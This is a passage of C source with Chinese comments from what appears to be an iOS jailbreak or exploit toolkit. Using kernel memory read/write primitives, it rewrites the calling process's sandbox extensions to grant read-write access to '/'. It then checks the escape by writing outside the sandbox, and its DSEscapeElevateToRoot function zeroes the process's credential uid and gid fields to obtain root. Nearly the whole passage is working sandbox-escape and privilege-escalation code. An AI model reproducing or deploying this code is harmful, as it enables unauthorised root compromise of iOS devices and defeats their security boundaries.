           (unsigned long long)sandbox, (unsigned long long)extSet);
    return extSet;
}

#pragma mark - 改写沙盒扩展

/// 把扩展数据里的路径改成 "/"，并把长度/哈希字段填成「永远有效」
static void ds_patch_ext(uint64_t ext, const char *rwClass)
{
    uint64_t data = ds_kread_safe(ext + DS_OFF_EXT_DATA);
    uint64_t dataLen = ds_kread_safe(ext + DS_OFF_EXT_DATALEN);

    if (ds_is_kptr(data) && dataLen > 0) {
        uint64_t head = ds_kread_safe(data);
        head = (head & ~0xFFFFULL) | 0x002FULL;              // data[0]='/', data[1]=0
        early_kwrite64(data, head);

        // 类别字符串写在 data+0x20：com.apple.app-sandbox.read-write
        if (rwClass) {
            char buffer[32];
            memset(buffer, 0, sizeof(buffer));
            strncpy(buffer, rwClass, sizeof(buffer) - 1);
            for (int i = 0; i < 4; i++) {
                uint64_t chunk = 0;
                memcpy(&chunk, buffer + i * 8, 8);
                early_kwrite64(data + 0x20 + i * 8, chunk);
                early_kwrite64(data + 0x40 + i * 8, 0);
            }
        }
    }

    // ext + data 处：+0x08 = 1，+0x10 = 全 1（填满 hash 槽）
    early_kwrite64(ext + DS_OFF_EXT_DATA + 0x08, 1);
    early_kwrite64(ext + DS_OFF_EXT_DATA + 0x10, 0xFFFFFFFFFFFFFFFFULL);
}

static int ds_patch_chain(uint64_t header, const char *rwClass)
{
    int patched = 0;
    uint64_t hdr = header;

    // 与 lara patchchain 逐行一致：ext = S(kread(hdr+0x8))，next = S(kread(hdr))
    for (int i = 0; i < 64 && ds_is_kptr(hdr); i++) {
        uint64_t ext = ds_normalize_ptr(ds_kread_safe(hdr + 0x8));
        if (ds_is_kptr(ext)) {
            ds_patch_ext(ext, rwClass);
            patched++;
        }
        uint64_t next = ds_kread_safe(hdr);
        if (!next) break;
        uint64_t nextStripped = ds_normalize_ptr(next);
        if (!ds_is_kptr(nextStripped) || nextStripped == hdr) break;
        hdr = nextStripped;
    }
    return patched;
}

static int DSEscapeSandboxInternal(void)
{
    uint64_t ucred = ds_discover_identities_v3();
    if (!ucred) return -2;

    uint64_t sandbox = 0;
    uint64_t extSet = ds_resolve_sandbox_extset(ucred, &sandbox);
    if (!extSet) {
        ds_log("[逃逸] 沙盒链路没能确认；转储这个已确认的 cred（只读，不做任何写操作）：");
        ds_dump_words("cred", ucred, 0x20);
        return -2;
    }
    (void)sandbox;

    const char *rwClass = "com.apple.app-sandbox.read-write";

    int patched = 0;
    for (int slot = 0; slot < DS_EXT_SLOTS; slot++) {
        uint64_t header = ds_normalize_ptr(ds_kread_safe(extSet + slot * 8));
        if (ds_is_kaddr(header)) patched += ds_patch_chain(header, rwClass);
    }
    ds_log("[逃逸] 改写了 %d 个沙盒扩展", patched);

    // 类别改成读写
    int classed = 0;
    for (int slot = 0; slot < DS_EXT_SLOTS; slot++) {
        uint64_t header = ds_normalize_ptr(ds_kread_safe(extSet + slot * 8));
        if (!ds_is_kaddr(header)) continue;
        uint64_t ext = ds_normalize_ptr(ds_kread_safe(header + 0x8));
        if (!ds_is_kaddr(ext)) continue;
        uint64_t data = ds_kread_safe(ext + DS_OFF_EXT_DATA);
        if (!ds_is_kaddr(data)) continue;
        early_kwrite64(header + 0x10, data + 0x20);
        classed++;
    }
    ds_log("[逃逸] 改了 %d 个扩展的类别", classed);

    // 空槽位用第一个有效 header 填满（hash 表查找才会命中）
    uint64_t firstHeader = 0;
    for (int slot = 0; slot < DS_EXT_SLOTS && !firstHeader; slot++) {
        uint64_t header = ds_normalize_ptr(ds_kread_safe(extSet + slot * 8));
        if (ds_is_kaddr(header)) firstHeader = header;
    }
    if (firstHeader) {
        int filled = 0;
        for (int slot = 0; slot < DS_EXT_SLOTS; slot++) {
            uint64_t header = ds_normalize_ptr(ds_kread_safe(extSet + slot * 8));
            if (!ds_is_kaddr(header)) {
                early_kwrite64(extSet + slot * 8, firstHeader);
                filled++;
            }
        }
        ds_log("[逃逸] 补了 %d 个空 hash 槽", filled);
    }

    if (patched == 0) {
        ds_log("[逃逸] 一个扩展都没改到，判定失败");
        return -3;
    }
    return 0;
}

int DSEscapeSandbox(ds_escape_log_fn log)
{
    gLog = log;
    int result = DSEscapeSandboxInternal();

    // 自检：真的能写沙盒外的路径才算成功
    const char *probe = "/var/mobile/.dsfile_probe";
    int fd = open(probe, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd >= 0) {
        close(fd);
        unlink(probe);
        ds_log("[逃逸] 自检通过：可以写沙盒外路径");
        gLog = NULL;
        return 0;
    }

    ds_log("[逃逸] 自检失败（errno=%d），沙盒没真正打开", errno);
    gLog = NULL;
    return (result == 0) ? -3 : result;
}

#pragma mark - 把本进程凭据改成 root

int DSEscapeElevateToRoot(ds_escape_log_fn log)
{
    gLog = log;

    if (getuid() == 0) {
        ds_log("[提权] 已经是 root");
        gLog = NULL;
        return 0;
    }

    uint64_t ucred = ds_discover_identities_v3();
    if (!ucred) { gLog = NULL; return -2; }

    uint64_t posix = ucred + DS_OFF_UCRED_POSIX;

    // cr_uid / cr_ruid
    uint64_t v = ds_kread_safe(posix + DS_OFF_POSIX_UID);
    v &= ~0xFFFFFFFFULL;                                  // cr_uid = 0
    early_kwrite64(posix + DS_OFF_POSIX_UID, v);
    v = ds_kread_safe(posix + DS_OFF_POSIX_UID);
    v &= ~0xFFFFFFFF00000000ULL;                          // cr_ruid = 0
    early_kwrite64(posix + DS_OFF_POSIX_UID, v);

    // cr_svuid = 0，cr_ngroups = 1
    v = ds_kread_safe(posix + DS_OFF_POSIX_SVUID);
    v &= ~0xFFFFFFFFULL;                                  // cr_svuid = 0
    v = (v & ~0xFFFFFFFF00000000ULL) | (1ULL << 32);      // cr_ngroups = 1
    early_kwrite64(posix + DS_OFF_POSIX_SVUID, v);

    // cr_groups[0..1] = 0
    early_kwrite64(posix + DS_OFF_POSIX_GROUPS_0, 0);

    // cr_rgid / cr_svgid = 0
    early_kwrite64(posix + DS_OFF_POSIX_RGID, 0);

    bool ok = (getuid() == 0);
    ds_log("[提权] 改写完成，getuid()=%d（%s）", (int)getuid(), ok ? "成功" : "失败");
    gLog = NULL;
    return ok ? 0 : -3;
}

#pragma mark - 诊断

unsigned long long DSEscapeKernelBase(void)
{
    return (unsigned long long)g_ctx.kernel_base;
}

unsigned long long DSEscapeSelfProc(void)
{
    return (unsigned long long)gSelfProc;
}

unsigned long long DSEscapeThreadTroOffset(void)
{
    return (unsigned long long)gThreadTroOffset;
}
